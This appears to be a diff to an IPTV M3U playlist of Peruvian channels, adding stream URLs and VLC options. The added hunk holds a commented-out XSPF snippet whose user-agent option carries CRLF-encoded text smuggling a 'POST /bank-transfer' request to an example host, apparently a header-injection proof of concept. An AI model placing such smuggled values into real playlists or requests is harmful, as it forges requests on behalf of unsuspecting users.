@@ -74,6 +74,30 @@ http://168.181.122.234:8000/play/a019/index.m3u
 #EXTINF:-1 tvg-id="Bob Esponja TV" tvg-name="Bob Esponja TV" tvg-logo="https://w7.pngwing.com/pngs/639/164/png-transparent-spongebob-squarepants-with-logo-cartoons-spongebob.png" group-title="Nacional",Bob Esponja TV
 http://stitcher-ipv4.pluto.tv/v1/stitch/embed/hls/channel/6254598f5083f800076d8563/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=1YNY&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&profileLimit=&profileFloor=&embedPartner=samsung-tvplus
 #EXTINF:-1 tvg-id="Cartoon Network" tvg-name="Cartoon Network" tvg-logo="https://upload.wikimedia.org/wikipedia/commons/f/fe/CARTOON_NETWORK_logo.png" group-title="Nacional",Cartoon Network
+#EXTVLCOPT--http-reconnect=true
+#EXTVLCOPT:http-referrer=http://181.78.8.90:16123
+#EXTVLCOPT:http-user-agent=Lavf/57.71.001
+#EXTVLCOPT:network-caching=1000
+#<?xml version="1.0" encoding="UTF-8"?>
+#<playlist
+  #xmlns="http://xspf.org/ns/0/"
+  #xmlns:vlc="http://www.videolan.org/vlc/playlist/ns/0/"
+  #version="1">
+  #<title>Liste de lecture</title>
+  #<trackList>
+    #<track>
+      #<location>http://www.example.org/stream.m3u8</location>
+      #<extension application="http://www.videolan.org/vlc/playlist/0">
+        #<vlc:id>0</vlc:id>
+        #<vlc:option>http-user-agent=Hacked/0&#13;&#10;&#13;&#10;POST /bank-transfer HTTP/1.1&#13;&#10;Host: account.piggy-bank.example.com&#13;&#10;Content-Length: 12&#13;&#10;&#13;&#10;Hello world!</vlc:option>
+      #</extension>
+    #</track>
+  #</trackList>
+  #<extension application="http://www.videolan.org/vlc/playlist/0">
+    #<vlc:item tid="0"/>
+  #</extension>
+#</playlist>
+#EXTVLCOPT:http-user-agent=vlc/2.1.3 libvlc/2.1.3
 http://181.78.8.90:16123/play/ch09
 #EXTINF:-1 tvg-id="Universal Cinema" tvg-name="Universal Cinema" tvg-logo="https://upload.wikimedia.org/wikipedia/commons/9/9b/Universal_Cinema_2021.png" group-title="Nacional",Universal Cinema
 http://168.181.122.234:8000/play/a02u/index.m3u
@@ -121,7 +145,7 @@ https://live-evg7.tv360.bitel.com.pe/index.m3u8?uid=1111947
 
 
 
-#EXTINF:-1, tvg-logo="https://cdn.mitvstatic.com/channels/pe_az-corazon_m.png" group-title="Nacional",Azcorazon
+#EXTINF:-1 tvg-id="Azcorazon" tvg-name="Azcorazon" tvg-logo="https://cdn.mitvstatic.com/channels/pe_az-corazon_m.png" group-title="Nacional",Azcorazon
 #EXTVLCOPT--http-reconnect=true
 #EXTVLCOPT:http-referrer=http://e10.cdnfree.cloud:2052
 #EXTVLCOPT:http-user-agent=Lavf/57.71.001
